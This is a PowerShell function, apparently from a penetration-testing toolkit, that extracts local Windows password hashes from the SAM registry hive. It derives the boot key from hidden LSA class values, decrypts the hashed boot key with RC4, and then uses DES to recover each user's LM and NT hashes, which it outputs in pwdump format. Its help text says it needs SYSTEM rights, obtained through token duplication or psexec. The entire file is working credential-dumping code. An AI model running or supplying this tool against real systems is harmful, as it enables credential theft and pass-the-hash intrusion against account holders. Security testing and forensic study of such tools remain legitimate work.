function Get-TSLocalHash {
<#
  .SYNOPSIS
  Extracts hashes from SAM

  .DESCRIPTION
  The Get-TSHash CmdLet extracts the hashes from SAM. The CmdLet
  Requires an elevated prompt and local system permissions. You can use Enable-TSDuplicateToken or psexec to retrieve system permissions.

  .EXAMPLE
  Enable-TSDuplicateToken

  Get-TSHash
#>

[CmdletBinding()]
param()

$signature = @"
[DllImport("advapi32.dll", CharSet = CharSet.Auto)]
 public static extern int RegOpenKeyEx(
    int hKey,
    string subKey,
    int ulOptions,
    int samDesired,
    out int hkResult);

[DllImport("advapi32.dll", EntryPoint = "RegEnumKeyEx")]
extern public static int RegEnumKeyEx(
    int hkey,
    int index,
    StringBuilder lpName,
    ref int lpcbName,
    int reserved,
    StringBuilder lpClass,
    ref int lpcbClass,
    out long lpftLastWriteTime);

[DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
extern public static int RegQueryInfoKey(
    int hkey,
    StringBuilder lpClass,
    ref int lpcbClass,
    int lpReserved,
    out int lpcSubKeys,
    out int lpcbMaxSubKeyLen,
    out int lpcbMaxClassLen,
    out int lpcValues,
    out int lpcbMaxValueNameLen,
    out int lpcbMaxValueLen,
    out int lpcbSecurityDescriptor,
    IntPtr lpftLastWriteTime);

[DllImport("advapi32.dll", SetLastError=true)]
public static extern int RegCloseKey(
    int hKey);

// Shift Class From Huddled Masses
public class Shift {
    public static int   Right(int x,   int count) { return x >> count; }
    public static uint  Right(uint x,  int count) { return x >> count; }
    public static long  Right(long x,  int count) { return x >> count; }
    public static ulong Right(ulong x, int count) { return x >> count; }
    public static int    Left(int x,   int count) { return x << count; }
    public static uint   Left(uint x,  int count) { return x << count; }
    public static long   Left(long x,  int count) { return x << count; }
    public static ulong  Left(ulong x, int count) { return x << count; }
}
"@

  # Add Type
  Add-Type -MemberDefinition $signature -Name HashDump -Namespace TrueSec -UsingNamespace System.Text
  
  # Add Script constants, as described here
  # http://code.google.com/p/volatility/source/browse/trunk/volatility/?r=1587#volatility%2Fwin32
  
  # Odd Parity
  $odd_parity = @(
    1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
    16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
    32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
    49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
    64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
    81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
    97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
    112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
    128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
    145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
    161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
    176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
    193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
    208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
    224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
    241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
  );
  
  # Constants for SAM decrypt algorithm
  $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0")
  $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0")
  $antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0")
  $almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0")
  $lmKey = [Text.Encoding]::ASCII.GetBytes("KGS!@#$%`0")
  
  $empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
  $empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
  
  # Permutation matrix for boot key
  $permutationMatrix = 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7
  
  #=======================================
  # BootKey
  #=======================================
  
  # Enumerate Keys and return hidden value
  $values = "JD","Skew1","GBG","Data" | ForEach-Object {
    $baseKey = 0x80000002
    $subKey = "SYSTEM\CurrentControlSet\Control\Lsa\$_"
    [int]$hKey = 0
    # Open Reg Key using RegOpenKeyEx Method
    [void][TrueSec.HashDump]::RegOpenKeyEx($baseKey, $subKey, 0, 0x19, [ref]$hkey)
  
    # Read Reg Key Data using RegQueryInfoKey Method
    $lpClass = New-Object Text.Stringbuilder 1024
    [int]$length = 1024
    [void][TrueSec.HashDump]::RegQueryInfoKey($hkey, $lpClass,[ref]$length,0, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, 0)
    $lpClass.ToString()
  
    # Close Reg Key using RegCloseKey Method
    [void][TrueSec.HashDump]::RegCloseKey($hKey)
  }
  
  # Convert Array to String
  $valueString = [string]::Join("",$values)
  
  # Scramble Values
  $byte = new-object byte[] $($valueString.Length/2)
  0..$($byte.Length-1) | ForEach-Object {
    $byte[$_] = [Convert]::ToByte($valueString.Substring($($_*2),2),16)
  }
  
  $scrambledBootKey = new-object byte[] 16;
  
  $permutationMatrix | ForEach-Object -begin {$i=0} -Process { $scrambledBootKey[$i] = $byte[$_];$i++}
  
  #=======================================
  # HbootKey
  #=======================================
  
  # Get byte array Value from registry
  $f = Get-ItemProperty -Path HKLM:\SAM\SAM\Domains\Account | Select-Object -ExpandProperty F
  
  # Create RC4 Key
  $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($f[0x70..0x7F] + $aqwerty + $scrambledBootKey + $anum);
  $s = 0..255
  
  0..255 | ForEach-Object -Begin { [long]$j = 0 } -Process {
    $j = ($j + $rc4key[ $($_ % $rc4key.Length) ] + $s[$_]) % $s.Length
    $tmp = $s[$_]
    $s[$_] = $s[$j]
    $s[$j] = $tmp
  }
  
  $data = $F[0x80..0x9F]
  $hBootKey = New-Object byte[] $data.Length
  $s2 = $s[0..$($s.Length)];
  
  0..$($data.Length-1) | ForEach-Object -begin {$i=0;$j=0;} -Process {
    $i = ($i+1) % $S2.Length;
    $j = ($j + $S2[$i]) % $S2.Length;
    $tmp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $tmp;
    $a = $data[$_];
    $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
    $hBootKey[$_] = ($a -bxor $b);
  }
  
  #=============================================
  # Get User Keys
  #=============================================
  
  $users = Get-ChildItem HKLM:\SAM\SAM\Domains\Account\Users | Where-Object { $_.PSCHildName -match "^[0-9A-Fa-f]{8}$" } | ForEach-Object {
    New-Object PSObject -Property @{
      UserName = $(
        [Text.Encoding]::Unicode.GetString(
          $($_.GetValue("V")),
           [BitConverter]::ToInt32($_.GetValue("V")[0x0c..0x0f],0) + 0xCC, [BitConverter]::ToInt32($_.GetValue("V")[0x10..0x13],0)
        );
      );
      Rid = $(
        [Convert]::ToInt32($_.PSChildName, 16)
      );
      V = $( [byte[]]($_.GetValue("V")) );
      HashOffset = $( [BitConverter]::ToUInt32($_.GetValue("V")[0x9c..0x9f],0) + 0xCC )
    }
  }
  
  #==============================================
  # Get User Hashes
  #==============================================
  
  foreach($user in $users) {
    # Set encypted nt & lm hash to null
    [byte[]]$enc_lm_hash = $null
    [byte[]]$enc_nt_hash = $null
  
    if($user.HashOffset + 0x28 -lt $user.V.Length) {
      $lm_hash_offset = $user.HashOffset + 4
      $nt_hash_offset = $user.HashOffset + 8 + 0x10
  
      $enc_lm_hash = $user.V[$($lm_hash_offset)..$($lm_hash_offset + 0x0f)]
      $enc_nt_hash = $user.V[$($nt_hash_offset)..$($nt_hash_offset + 0x0f)]
  
    } elseif($user.HashOffset + 0x14 -lt $user.V.Length) {
      $nt_hash_offset = $user.HashOffset + 8
      $enc_nt_hash = [byte[]]$user.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)]
    }
    # User Sid To Key
    $s1 = @();
    $s1 += [char]($user.Rid -band 0xFF);
    $s1 += [char]([TrueSec.HashDump+Shift]::Right($user.Rid,8) -band 0xFF);
    $s1 += [char]([TrueSec.HashDump+Shift]::Right($user.Rid,16) -band 0xFF);
    $s1 += [char]([TrueSec.HashDump+Shift]::Right($user.Rid,24) -band 0xFF);
    $s1 += $s1[0];
    $s1 += $s1[1];
    $s1 += $s1[2];
    $s2 = @();
    $s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2];
    $s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2];
  
    # String to Key
    $keys = @()
    $keys = $s1, $s2 | ForEach-Object {
      $key = @();
      $key += [TrueSec.HashDump+Shift]::Right([int]($_[0]), 1 );
      $key += [TrueSec.HashDump+Shift]::Left( $([int]($_[0]) -band 0x01), 6) -bor [TrueSec.HashDump+Shift]::Right([int]($_[1]),2);
      $key += [TrueSec.HashDump+Shift]::Left( $([int]($_[1]) -band 0x03), 5) -bor [TrueSec.HashDump+Shift]::Right([int]($_[2]),3);
      $key += [TrueSec.HashDump+Shift]::Left( $([int]($_[2]) -band 0x07), 4) -bor [TrueSec.HashDump+Shift]::Right([int]($_[3]),4);
      $key += [TrueSec.HashDump+Shift]::Left( $([int]($_[3]) -band 0x0F), 3) -bor [TrueSec.HashDump+Shift]::Right([int]($_[4]),5);
      $key += [TrueSec.HashDump+Shift]::Left( $([int]($_[4]) -band 0x1F), 2) -bor [TrueSec.HashDump+Shift]::Right([int]($_[5]),6);
      $key += [TrueSec.HashDump+Shift]::Left( $([int]($_[5]) -band 0x3F), 1) -bor [TrueSec.HashDump+Shift]::Right([int]($_[6]),7);
      $key += $([int]($_[6]) -band 0x7F);
      0..7 | %{
        $key[$_] = [TrueSec.HashDump+Shift]::Left($key[$_], 1);
        $key[$_] = $odd_parity[$key[$_]];
      }
      , $key
    }
    #===========================================
    # LM Hash
    #===========================================
    if($enc_lm_hash) {
      $md5 = [Security.Cryptography.MD5]::Create();
      $rc4key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($user.Rid) + $almpassword);
  
      # RC4
      $s = 0..255
      0..255 | ForEach-Object -Begin { [long]$j = 0 } -Process {
        $j = ($j + $rc4key[ $($_ % $rc4key.Length) ] + $s[$_]) % $s.Length
        $tmp = $s[$_]
        $s[$_] = $s[$j]
        $s[$j] = $tmp
      }
      
      $data = $enc_lm_hash
      $obfuscatedKey = New-Object byte[] $data.Length
      $s2 = $s[0..$($s.Length)];
      
      0..$($data.Length-1) | ForEach-Object -begin {$i=0;$j=0;} -Process {
        $i = ($i+1) % $S2.Length;
        $j = ($j + $S2[$i]) % $S2.Length;
        $tmp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $tmp;
        $a = $data[$_];
        $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
        $obfuscatedKey[$_] = ($a -bxor $b);
      }
  
      $lmHash = @()
      # First Part
      $des = new-object Security.Cryptography.DESCryptoServiceProvider
      $des.Mode = [Security.Cryptography.CipherMode]::ECB
      $des.Padding = [Security.Cryptography.PaddingMode]::None
      $des.Key = $keys[0]
      $des.IV = $keys[0]
      $transform = $des.CreateDecryptor()
      $lmHash += $transform.TransformFinalBlock($obfuscatedKey[0..7], 0, $($obfuscatedKey[0..7]).Length);
      
      # Second Part
      $des = new-object Security.Cryptography.DESCryptoServiceProvider
      $des.Mode = [Security.Cryptography.CipherMode]::ECB
      $des.Padding = [Security.Cryptography.PaddingMode]::None
      $des.Key = $keys[1]
      $des.IV = $keys[1]
      $transform = $des.CreateDecryptor()
      $lmHash += $transform.TransformFinalBlock($($obfuscatedKey[8..$($obfuscatedKey.Length -1)]), 0, $($obfuscatedKey[8..$($obfuscatedKey.Length -1)]).Length);
    } else {
      # Return Empty LM Hash
      $lmHash = $empty_lm
    }
  
    #===========================================
    # NT Hash
    #===========================================
    if($enc_nt_hash) {
      $md5 = [Security.Cryptography.MD5]::Create();
      $rc4key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($user.Rid) + $antpassword);
  
      # RC4
      $s = 0..255
      0..255 | ForEach-Object -Begin { [long]$j = 0 } -Process {
        $j = ($j + $rc4key[ $($_ % $rc4key.Length) ] + $s[$_]) % $s.Length
        $tmp = $s[$_]
        $s[$_] = $s[$j]
        $s[$j] = $tmp
      }
      
      $data = $enc_nt_hash
      $obfuscatedKey = New-Object byte[] $data.Length
      $s2 = $s[0..$($s.Length)];
      
      0..$($data.Length-1) | ForEach-Object -begin {$i=0;$j=0;} -Process {
        $i = ($i+1) % $S2.Length;
        $j = ($j + $S2[$i]) % $S2.Length;
        $tmp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $tmp;
        $a = $data[$_];
        $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
        $obfuscatedKey[$_] = ($a -bxor $b);
      }
  
      $ntHash = @()
      # First Part
      $des = new-object Security.Cryptography.DESCryptoServiceProvider
      $des.Mode = [Security.Cryptography.CipherMode]::ECB
      $des.Padding = [Security.Cryptography.PaddingMode]::None
      $des.Key = $keys[0]
      $des.IV = $keys[0]
      $transform = $des.CreateDecryptor()
      $ntHash += $transform.TransformFinalBlock($obfuscatedKey[0..7], 0, $($obfuscatedKey[0..7]).Length);
      
      # Second Part
      $des = new-object Security.Cryptography.DESCryptoServiceProvider
      $des.Mode = [Security.Cryptography.CipherMode]::ECB
      $des.Padding = [Security.Cryptography.PaddingMode]::None
      $des.Key = $keys[1]
      $des.IV = $keys[1]
      $transform = $des.CreateDecryptor()
      $ntHash += $transform.TransformFinalBlock($($obfuscatedKey[8..$($obfuscatedKey.Length -1)]), 0, $($obfuscatedKey[8..$($obfuscatedKey.Length -1)]).Length);
    } else {
      # Return Empty NT Hash
      $ntHash = $empty_nt
    }
    $user | foreach-object {
      New-Object PSObject -Property @{
        UserName = $($_.UserName);
        Rid = $($_.Rid);
        NTHash = $([BitConverter]::ToString($ntHash).Replace("-","").ToLower());
        LMHash = $([BitConverter]::ToString($lmHash).Replace("-","").ToLower());
        Hash = $("$($_.UserName):$($_.Rid):$([BitConverter]::ToString($lmHash).Replace('-','').ToLower()):$([BitConverter]::ToString($ntHash).Replace('-','').ToLower()):::")
      }
    }
  }
}
